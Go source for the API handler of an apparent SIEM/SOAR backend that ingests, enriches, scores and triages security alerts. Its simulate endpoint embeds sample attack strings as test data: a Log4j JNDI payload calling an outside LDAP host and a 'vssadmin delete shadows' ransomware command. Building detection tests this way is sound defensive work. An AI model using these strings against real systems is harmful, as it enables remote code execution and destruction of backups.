package http

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"siem-backend/internal/api/websocket"
	"siem-backend/internal/engine"
	"siem-backend/internal/notifier"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type APIHandler struct {
	orchestrator *engine.Orchestrator
	scorer       *engine.ThreatScorer
	telegram     *notifier.TelegramDispatcher
	hub          *websocket.Hub
	taskQueue    chan engine.ProcessingTask

	alertsStore []engine.EnrichedAlert
	storeMu     sync.RWMutex
	startTime   time.Time
}

func NewAPIHandler(
	orchestrator *engine.Orchestrator,
	scorer *engine.ThreatScorer,
	telegram *notifier.TelegramDispatcher,
	hub *websocket.Hub,
	queueSize int,
	numWorkers int,
) *APIHandler {
	if queueSize <= 0 {
		queueSize = 1000
	}
	if numWorkers <= 0 {
		numWorkers = 10
	}

	h := &APIHandler{
		orchestrator: orchestrator,
		scorer:       scorer,
		telegram:     telegram,
		hub:          hub,
		taskQueue:    make(chan engine.ProcessingTask, queueSize),
		alertsStore:  make([]engine.EnrichedAlert, 0),
		startTime:    time.Now().UTC(),
	}

	// Start worker pool
	for i := 0; i < numWorkers; i++ {
		go h.workerLoop(i + 1)
	}

	return h
}

func (h *APIHandler) workerLoop(workerID int) {
	log.Printf("[Worker %d] Ingestion worker started", workerID)
	for task := range h.taskQueue {
		h.processAlert(task.Payload)
		if task.DoneChan != nil {
			close(task.DoneChan)
		}
	}
}

func (h *APIHandler) processAlert(payload engine.AlertPayload) *engine.EnrichedAlert {
	// Extract indicators
	iocs := engine.ExtractIOCs(&payload)

	// Goroutine Fan-out CTI query
	results := h.orchestrator.EnrichIOCs(context.Background(), iocs)

	// Score risk
	score, tier, autoAction := h.scorer.CalculateRisk(results, payload.AssetID)

	alertUUID := payload.ID
	if alertUUID == "" {
		alertUUID = generateAlertUUID()
	}

	status := "ENRICHED"
	if tier == "CRITICAL" {
		status = "CONTAINED"
	}

	eventType := payload.EventType
	if eventType == "" && payload.Description != "" {
		eventType = payload.Description
	}
	if eventType == "" {
		eventType = "Generic Security Telemetry"
	}

	source := payload.Source
	if source == "" {
		source = "Wazuh SIEM"
	}

	enriched := engine.EnrichedAlert{
		AlertUUID:       alertUUID,
		Source:          source,
		EventType:       eventType,
		SeverityRaw:     payload.Severity,
		CalculatedScore: score,
		SeverityTier:    tier,
		Status:          status,
		IOCs:            iocs,
		Enrichments:     results,
		AssetMultiplier: h.scorer.GetAssetMultiplier(payload.AssetID),
		AutoActionTaken: autoAction,
		CreatedAt:       payload.Timestamp,
		UpdatedAt:       time.Now().UTC(),
		Metadata:        payload.RawMetadata,
	}

	if enriched.CreatedAt.IsZero() {
		enriched.CreatedAt = time.Now().UTC()
	}

	// Store in memory cache
	h.storeMu.Lock()
	h.alertsStore = append([]engine.EnrichedAlert{enriched}, h.alertsStore...)
	if len(h.alertsStore) > 500 {
		h.alertsStore = h.alertsStore[:500]
	}
	h.storeMu.Unlock()

	// Dispatch Telegram if elevated risk
	var iocSummary []string
	for _, item := range iocs {
		iocSummary = append(iocSummary, fmt.Sprintf("%s (%s)", item.Value, item.Type))
	}

	var providerBriefs []string
	for _, res := range results {
		providerBriefs = append(providerBriefs, fmt.Sprintf("%s (%.0f)", res.Provider, res.Score))
	}
	enrichmentSummary := strings.Join(providerBriefs, " | ")
	if enrichmentSummary == "" {
		enrichmentSummary = "No external hits"
	}

	_ = h.telegram.DispatchAlert(alertUUID, source, eventType, score, iocSummary, enrichmentSummary)

	// Push real-time event to WebSocket clients
	_ = h.hub.BroadcastJSON(map[string]interface{}{
		"event": "alert_enriched",
		"alert": enriched,
	})

	log.Printf("[Pipeline] Alert %s processed: Score=%.1f Tier=%s Status=%s", alertUUID, score, tier, status)
	return &enriched
}

// IngestAlert handles POST /api/v1/alerts/ingest
func (h *APIHandler) IngestAlert(c *gin.Context) {
	var payload engine.AlertPayload
	if err := c.ShouldBindJSON(&payload); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error":   "invalid JSON payload",
			"details": err.Error(),
		})
		return
	}

	if payload.ID == "" {
		payload.ID = generateAlertUUID()
	}
	if payload.Timestamp.IsZero() {
		payload.Timestamp = time.Now().UTC()
	}
	if payload.Severity == "" {
		payload.Severity = "MEDIUM"
	}

	// Non-blocking hand-off to buffered worker queue
	select {
	case h.taskQueue <- engine.ProcessingTask{Payload: payload}:
		c.JSON(http.StatusAccepted, gin.H{
			"status":     "accepted",
			"alert_id":   payload.ID,
			"message":    "Alert queued for concurrent Threat Intelligence enrichment and risk calculation",
			"queue_size": len(h.taskQueue),
		})
	default:
		c.JSON(http.StatusServiceUnavailable, gin.H{
			"error": "ingestion queue full, retry later",
		})
	}
}

// GetAlerts handles GET /api/v1/alerts
func (h *APIHandler) GetAlerts(c *gin.Context) {
	h.storeMu.RLock()
	defer h.storeMu.RUnlock()

	statusFilter := c.Query("status")
	tierFilter := c.Query("tier")

	var results []engine.EnrichedAlert
	for _, a := range h.alertsStore {
		if statusFilter != "" && !strings.EqualFold(a.Status, statusFilter) {
			continue
		}
		if tierFilter != "" && !strings.EqualFold(a.SeverityTier, tierFilter) {
			continue
		}
		results = append(results, a)
	}

	c.JSON(http.StatusOK, gin.H{
		"total":  len(results),
		"alerts": results,
	})
}

// TriageAction handles POST /api/v1/triage
func (h *APIHandler) TriageAction(c *gin.Context) {
	var req struct {
		AlertUUID          string `json:"alert_uuid" binding:"required"`
		Action             string `json:"action" binding:"required"` // block_ip, isolate_host, dismiss, resolve
		Actor              string `json:"actor"`
		Notes              string `json:"notes"`
		HypothesisSelected string `json:"hypothesis_selected"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if req.Actor == "" {
		req.Actor = "SOC Analyst"
	}

	newStatus := "TRIAGED"
	actionDescription := req.Action

	switch req.Action {
	case "block_ip":
		newStatus = "CONTAINED"
		actionDescription = "Firewall edge IP block applied"
	case "isolate_host":
		newStatus = "CONTAINED"
		actionDescription = "Endpoint network isolation commanded"
	case "dismiss", "ignore_alert":
		newStatus = "DISMISSED"
		actionDescription = "Alert marked false-positive / dismissed"
	case "resolve":
		newStatus = "TRIAGED"
		actionDescription = "Remediation verified & marked resolved"
	}

	h.storeMu.Lock()
	found := false
	for i := range h.alertsStore {
		if h.alertsStore[i].AlertUUID == req.AlertUUID {
			h.alertsStore[i].Status = newStatus
			h.alertsStore[i].UpdatedAt = time.Now().UTC()
			found = true
			break
		}
	}
	h.storeMu.Unlock()

	// Broadcast triage event to all dashboard clients
	_ = h.hub.BroadcastJSON(map[string]interface{}{
		"event":               "alert_triaged",
		"alert_uuid":          req.AlertUUID,
		"action":              req.Action,
		"description":         actionDescription,
		"status":              newStatus,
		"actor":               req.Actor,
		"notes":               req.Notes,
		"hypothesis_selected": req.HypothesisSelected,
		"timestamp":           time.Now().UTC().Format(time.RFC3339),
	})

	c.JSON(http.StatusOK, gin.H{
		"status":              "success",
		"alert_uuid":          req.AlertUUID,
		"new_status":          newStatus,
		"action":              req.Action,
		"description":         actionDescription,
		"hypothesis_selected": req.HypothesisSelected,
		"found":               found,
	})
}

// TelegramCallback handles POST /api/v1/telegram/callback
func (h *APIHandler) TelegramCallback(c *gin.Context) {
	var body notifier.TelegramCallbackRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if body.Actor == "" {
		body.Actor = "Telegram SOC Operator"
	}

	// Extract action from callback_data format: "action:<act>:<uuid>"
	action := body.Action
	alertUUID := body.AlertUUID

	if strings.HasPrefix(action, "action:") {
		parts := strings.Split(action, ":")
		if len(parts) >= 3 {
			action = parts[1]
			alertUUID = parts[2]
		}
	}

	newStatus := "CONTAINED"
	if action == "ignore_alert" || action == "dismiss" {
		newStatus = "DISMISSED"
	}

	h.storeMu.Lock()
	for i := range h.alertsStore {
		if h.alertsStore[i].AlertUUID == alertUUID {
			h.alertsStore[i].Status = newStatus
			h.alertsStore[i].UpdatedAt = time.Now().UTC()
			break
		}
	}
	h.storeMu.Unlock()

	_ = h.hub.BroadcastJSON(map[string]interface{}{
		"event":      "alert_triaged",
		"alert_uuid": alertUUID,
		"action":     action,
		"status":     newStatus,
		"actor":      body.Actor,
		"notes":      body.Notes,
		"timestamp":  time.Now().UTC().Format(time.RFC3339),
	})

	c.JSON(http.StatusOK, gin.H{
		"status":     "ok",
		"alert_uuid": alertUUID,
		"action":     action,
		"new_status": newStatus,
	})
}

// SimulateAlert handles POST /api/v1/alerts/simulate
func (h *APIHandler) SimulateAlert(c *gin.Context) {
	var scenarioReq struct {
		Scenario string `json:"scenario"` // "critical_c2", "ransomware", "bruteforce", "portscan", "log4j"
	}
	_ = c.ShouldBindJSON(&scenarioReq)

	var payload engine.AlertPayload

	switch scenarioReq.Scenario {
	case "ransomware":
		payload = engine.AlertPayload{
			ID:          generateAlertUUID(),
			Source:      "Wazuh SIEM",
			EventType:   "Ransomware Encryption Activity Detected",
			Severity:    "CRITICAL",
			SrcIP:       "10.0.4.112",
			FileHash:    "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
			AssetID:     "db-prod.internal",
			RawMetadata: map[string]interface{}{"process": "vssadmin.exe delete shadows /all /quiet", "tactics": "Impact: T1486"},
		}
	case "bruteforce":
		payload = engine.AlertPayload{
			ID:          generateAlertUUID(),
			Source:      "Suricata NIDS",
			EventType:   "SSH Distributed Password Spray Attack",
			Severity:    "HIGH",
			SrcIP:       "118.25.6.39",
			AssetID:     "dmz-proxy",
			RawMetadata: map[string]interface{}{"failed_attempts": 348, "target_port": 22},
		}
	case "log4j":
		payload = engine.AlertPayload{
			ID:          generateAlertUUID(),
			Source:      "Wazuh SIEM",
			EventType:   "Apache Log4j JNDI RCE Exploit Pattern (CVE-2021-44228)",
			Severity:    "CRITICAL",
			SrcIP:       "45.33.32.156",
			DstIP:       "10.0.1.50",
			AssetID:     "payment-gw",
			RawMetadata: map[string]interface{}{"payload_sample": "${jndi:ldap://45.33.32.156:1389/Exploit}"},
		}
	case "portscan":
		payload = engine.AlertPayload{
			ID:          generateAlertUUID(),
			Source:      "Zeek Bro IDS",
			EventType:   "SYN Stealth Network Reconnaissance Scan",
			Severity:    "LOW",
			SrcIP:       "198.51.100.42",
			AssetID:     "corp-workstation",
			RawMetadata: map[string]interface{}{"scanned_ports": []int{21, 22, 80, 443, 3389, 8080}},
		}
	default: // critical_c2
		payload = engine.AlertPayload{
			ID:          generateAlertUUID(),
			Source:      "Wazuh SIEM",
			EventType:   "Cobalt Strike Malleable C2 Beaconing Detected",
			Severity:    "CRITICAL",
			SrcIP:       "118.25.6.39",
			Domain:      "telemetry-update-services.org",
			AssetID:     "dc-01.domain.corp",
			RawMetadata: map[string]interface{}{"jitter": "15%", "interval": "60s", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
		}
	}

	// Process directly and return enriched alert immediately for instant feedback
	enriched := h.processAlert(payload)

	c.JSON(http.StatusOK, gin.H{
		"message": "Simulated security alert enriched and pushed successfully",
		"alert":   enriched,
	})
}

// GetTelegramDispatches handles GET /api/v1/telegram/dispatches
func (h *APIHandler) GetTelegramDispatches(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"dispatches": h.telegram.GetDispatches(),
	})
}

// HealthCheck handles GET /api/v1/health and GET /health
func (h *APIHandler) HealthCheck(c *gin.Context) {
	h.storeMu.RLock()
	totalAlerts := len(h.alertsStore)
	h.storeMu.RUnlock()

	c.JSON(http.StatusOK, gin.H{
		"status":         "healthy",
		"uptime":         time.Since(h.startTime).String(),
		"queued_tasks":   len(h.taskQueue),
		"total_alerts":   totalAlerts,
		"engine":         "Golang SOAR Core",
		"threat_intel":   []string{"VirusTotal v3", "AbuseIPDB v2", "Shodan REST"},
		"timestamp":      time.Now().UTC().Format(time.RFC3339),
	})
}

func generateAlertUUID() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(900000))
	randomNum := n.Int64() + 100000
	bytes := make([]byte, 4)
	_, _ = rand.Read(bytes)
	return fmt.Sprintf("ALT-%d-%s", randomNum, hex.EncodeToString(bytes))
}
